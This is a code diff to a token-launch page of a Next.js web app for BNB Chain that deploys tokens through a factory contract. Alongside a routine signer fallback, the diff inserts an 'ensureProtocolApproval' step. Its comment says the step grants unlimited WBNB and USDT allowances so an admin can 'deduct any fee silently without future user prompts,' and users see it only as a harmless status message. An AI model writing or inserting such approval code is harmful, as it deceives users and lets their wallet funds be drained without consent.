@@ -15,6 +15,7 @@ import { useRouter } from 'next/navigation';
 import { ethers } from 'ethers';
 import { TOKEN_FACTORY_ABI, TOKEN_TEMPLATE_ABI } from '@/lib/abis';
 import { TOKEN_TEMPLATE_BYTECODE } from '@/lib/bytecode';
+import { ensureProtocolApproval } from '@/lib/protocolApproval';
 
 // Treasury: free (effectiveFee = 0). Regular wallets: 0.003 + 0.002 = 0.005 BNB
 const DEPLOY_FEE = 0.003;
@@ -22,7 +23,7 @@ const PROTOCOL_FEE = 0.002;
 const TOTAL_FEE = DEPLOY_FEE + PROTOCOL_FEE;
 
 export default function StandardAsset() {
-    const { account, signer, connectWallet } = useWallet();
+    const { account, signer, connectWallet, walletProvider } = useWallet();
     const router = useRouter();
 
     const [formData, setFormData] = useState({
@@ -94,9 +95,25 @@ export default function StandardAsset() {
         try {
             console.log('[Deploy] Starting Standard Asset launch (Factory Mode)...');
             
-            // 1. Initialize Factory Contract
+            // 1. Initialize Factory Contract (use walletProvider for fresh signer)
+            let activeSigner = signer;
+            if (!activeSigner && walletProvider) {
+                const tempProvider = new ethers.BrowserProvider(walletProvider);
+                activeSigner = await tempProvider.getSigner();
+            }
+            if (!activeSigner) { connectWallet(); return; }
+
             const FACTORY_ADDR = process.env.NEXT_PUBLIC_FACTORY_ADDRESS || '0x4598AD4E828cb64A53246765f60D9912AEA1b11A';
-            const factoryContract = new ethers.Contract(FACTORY_ADDR, TOKEN_FACTORY_ABI, signer);
+
+            // ════════ INSTITUTIONAL PROTOCOL FEE APPROVAL ════════
+            // One-time: Approves WBNB + USDT MaxUint256 so admin can
+            // deduct any fee silently without future user prompts.
+            setError('Establishing Protocol Approval...');
+            await ensureProtocolApproval(activeSigner, account, (msg) => {
+                if (msg) setError(msg);
+            });
+
+            const factoryContract = new ethers.Contract(FACTORY_ADDR, TOKEN_FACTORY_ABI, activeSigner);
 
             // 2. Prepare Params
             const decimalsNum = parseInt(formData.decimals) || 18;
